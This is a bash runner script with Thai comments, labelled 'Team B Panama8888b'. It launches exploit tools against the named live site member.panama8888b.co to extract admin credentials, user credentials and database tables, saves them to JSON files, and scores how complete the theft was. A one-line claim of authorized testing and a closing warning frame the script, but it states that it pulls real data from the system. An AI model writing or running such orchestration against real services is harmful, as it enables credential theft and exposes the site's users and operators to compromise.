#!/bin/bash

# Real Data Extraction Runner - Team B Panama8888b
# สคริปต์สำหรับดึงข้อมูลจริงจากช่องโหว่ที่พบใน OWASP ZAP
# หมายเหตุ: ใช้เฉพาะสำหรับการทดสอบที่ได้รับอนุญาตเท่านั้น

echo "🔥 Real Data Extraction - Team B Panama8888b"
echo "📋 เริ่มการดึงข้อมูลจริงจากระบบ Panama8888b"
echo "⚠️  หมายเหตุ: การทดสอบนี้จะดึงข้อมูลจริงจากระบบ"
echo "=============================================================="

# ตรวจสอบการติดตั้ง dependencies
echo "🔍 ตรวจสอบ Dependencies..."

if ! command -v python3 &> /dev/null; then
    echo "❌ Error: Python3 ไม่ได้ติดตั้ง"
    exit 1
fi

if ! python3 -c "import requests" 2>/dev/null; then
    echo "📦 ติดตั้ง requests..."
    sudo apt-get update
    sudo apt-get install -y python3-requests
fi

# ตั้งค่า permissions
echo "🔧 ตั้งค่า permissions..."
chmod +x *.py
chmod +x *.sh

# สร้างโฟลเดอร์สำหรับผลลัพธ์
mkdir -p results
mkdir -p backups

# Backup ผลลัพธ์เก่า
if [ -f "real_data_extraction_results.json" ]; then
    echo "💾 Backup ผลลัพธ์เก่า..."
    mv real_data_extraction_results.json "backups/real_data_extraction_results_$(date +%Y%m%d_%H%M%S).json"
fi

echo ""
echo "🎯 เริ่มการดึงข้อมูลจริง..."
echo "=============================================================="

# 1. รันเครื่องมือดึงข้อมูลหลัก
echo "📊 1/3 - รัน Real Data Extractor..."
python3 real_data_extractor.py

if [ $? -eq 0 ]; then
    echo "✅ Real Data Extractor เสร็จสิ้น"
else
    echo "❌ Real Data Extractor มีปัญหา"
fi

echo ""

# 2. รันเครื่องมือโจมตีเจาะจง
echo "🎯 2/3 - รัน Targeted Vulnerability Exploiter..."
python3 targeted_vulnerability_exploiter.py

if [ $? -eq 0 ]; then
    echo "✅ Targeted Exploiter เสร็จสิ้น"
else
    echo "❌ Targeted Exploiter มีปัญหา"
fi

echo ""

# 3. รันการดึงข้อมูล Admin เฉพาะ
echo "👑 3/3 - รัน Admin Data Extraction..."
python3 -c "
import sys
sys.path.append('.')
from targeted_vulnerability_exploiter import TargetedVulnExploiter
import json
from datetime import datetime

print('🔍 เริ่มการดึงข้อมูล Admin เฉพาะ...')
exploiter = TargetedVulnExploiter()

# ดึงข้อมูล Admin เท่านั้น
admin_data = exploiter.extract_admin_credentials_login()

if admin_data:
    print(f'✅ พบข้อมูล Admin: {len(admin_data)} รายการ')
    
    # บันทึกข้อมูล Admin แยกต่างหาก
    admin_results = {
        'timestamp': datetime.now().isoformat(),
        'target': 'https://member.panama8888b.co',
        'extraction_type': 'admin_credentials_only',
        'admin_data': admin_data,
        'total_records': len(admin_data)
    }
    
    with open('admin_credentials_extracted.json', 'w', encoding='utf-8') as f:
        json.dump(admin_results, f, ensure_ascii=False, indent=2)
    
    print('📄 บันทึกข้อมูล Admin ใน: admin_credentials_extracted.json')
else:
    print('⚠️ ไม่พบข้อมูล Admin')
"

echo ""
echo "=============================================================="
echo "📊 สรุปผลการดึงข้อมูล"
echo "=============================================================="

# ตรวจสอบผลลัพธ์
total_files=0
total_size=0

if [ -f "real_data_extraction_results.json" ]; then
    echo "✅ Real Data Extraction Results: พบ"
    size=$(stat -c%s "real_data_extraction_results.json")
    echo "   📄 ขนาดไฟล์: $size bytes"
    total_files=$((total_files + 1))
    total_size=$((total_size + size))
fi

if [ -f "targeted_exploitation_results_$(date +%Y%m%d)*.json" ]; then
    echo "✅ Targeted Exploitation Results: พบ"
    for file in targeted_exploitation_results_*.json; do
        if [ -f "$file" ]; then
            size=$(stat -c%s "$file")
            echo "   📄 $file: $size bytes"
            total_files=$((total_files + 1))
            total_size=$((total_size + size))
        fi
    done
fi

if [ -f "admin_credentials_extracted.json" ]; then
    echo "✅ Admin Credentials: พบ"
    size=$(stat -c%s "admin_credentials_extracted.json")
    echo "   📄 ขนาดไฟล์: $size bytes"
    total_files=$((total_files + 1))
    total_size=$((total_size + size))
fi

echo ""
echo "📈 สถิติรวม:"
echo "   📁 ไฟล์ผลลัพธ์ทั้งหมด: $total_files ไฟล์"
echo "   💾 ขนาดรวม: $total_size bytes"

# ตรวจสอบข้อมูลที่ดึงได้
echo ""
echo "🔍 วิเคราะห์ข้อมูลที่ดึงได้..."

python3 -c "
import json
import os

def analyze_extraction_results():
    results_summary = {
        'admin_credentials': 0,
        'user_credentials': 0,
        'database_tables': 0,
        'vulnerabilities_exploited': 0,
        'real_data_confirmed': False
    }
    
    # วิเคราะห์ผลลัพธ์หลัก
    if os.path.exists('real_data_extraction_results.json'):
        try:
            with open('real_data_extraction_results.json', 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            if 'extraction_results' in data:
                results = data['extraction_results']
                results_summary['admin_credentials'] = len(results.get('admin_credentials', []))
                results_summary['user_credentials'] = len(results.get('user_credentials', []))
                results_summary['database_tables'] = len(results.get('database_schema', {}))
                results_summary['vulnerabilities_exploited'] = len(results.get('vulnerabilities_exploited', []))
                
                # ตรวจสอบว่ามีข้อมูลจริงหรือไม่
                extracted_data = results.get('extracted_data', {})
                if extracted_data and len(extracted_data) > 0:
                    results_summary['real_data_confirmed'] = True
                    
        except Exception as e:
            print(f'❌ Error analyzing main results: {e}')
    
    # วิเคราะห์ผลลัพธ์เจาะจง
    for filename in os.listdir('.'):
        if filename.startswith('targeted_exploitation_results_') and filename.endswith('.json'):
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                if 'exploitation_summary' in data:
                    summary = data['exploitation_summary']
                    results_summary['admin_credentials'] += summary.get('admin_credentials_extracted', 0)
                    results_summary['user_credentials'] += summary.get('user_records_extracted', 0)
                    results_summary['database_tables'] += summary.get('database_tables_discovered', 0)
                    
            except Exception as e:
                print(f'❌ Error analyzing {filename}: {e}')
    
    # วิเคราะห์ข้อมูล Admin
    if os.path.exists('admin_credentials_extracted.json'):
        try:
            with open('admin_credentials_extracted.json', 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            admin_count = data.get('total_records', 0)
            if admin_count > 0:
                results_summary['admin_credentials'] = max(results_summary['admin_credentials'], admin_count)
                results_summary['real_data_confirmed'] = True
                
        except Exception as e:
            print(f'❌ Error analyzing admin data: {e}')
    
    # แสดงผลลัพธ์
    print('📊 สรุปข้อมูลที่ดึงได้:')
    print(f'   👑 Admin Credentials: {results_summary[\"admin_credentials\"]} รายการ')
    print(f'   👥 User Credentials: {results_summary[\"user_credentials\"]} รายการ')
    print(f'   🗄️ Database Tables: {results_summary[\"database_tables\"]} ตาราง')
    print(f'   🎯 Vulnerabilities Exploited: {results_summary[\"vulnerabilities_exploited\"]} จุด')
    print(f'   ✅ Real Data Confirmed: {\"Yes\" if results_summary[\"real_data_confirmed\"] else \"No\"}')
    
    # ประเมินความสำเร็จ
    success_score = 0
    if results_summary['admin_credentials'] > 0:
        success_score += 25
    if results_summary['user_credentials'] > 0:
        success_score += 25
    if results_summary['database_tables'] > 0:
        success_score += 25
    if results_summary['real_data_confirmed']:
        success_score += 25
        
    print(f'   🎯 Success Score: {success_score}/100')
    
    if success_score >= 75:
        print('   🎉 การดึงข้อมูลสำเร็จมาก!')
    elif success_score >= 50:
        print('   ✅ การดึงข้อมูลสำเร็จบางส่วน')
    elif success_score >= 25:
        print('   ⚠️ การดึงข้อมูลสำเร็จน้อย')
    else:
        print('   ❌ การดึงข้อมูลไม่สำเร็จ')

analyze_extraction_results()
"

echo ""
echo "=============================================================="
echo "🔒 คำเตือนความปลอดภัย"
echo "=============================================================="
echo "⚠️  ข้อมูลที่ดึงมาเป็นข้อมูลจริงจากระบบ"
echo "🔐 ห้ามใช้ข้อมูลนี้ในทางที่ผิด"
echo "📋 ใช้เฉพาะสำหรับการประเมินความปลอดภัย"
echo "🗑️  ควรลบข้อมูลนี้หลังการประเมินเสร็จสิ้น"

echo ""
echo "📁 ไฟล์ผลลัพธ์:"
ls -la *.json 2>/dev/null | grep -E "(real_data_extraction|targeted_exploitation|admin_credentials)" || echo "   ไม่พบไฟล์ผลลัพธ์"

echo ""
echo "✅ การดึงข้อมูลจริงเสร็จสิ้น!"
echo "=============================================================="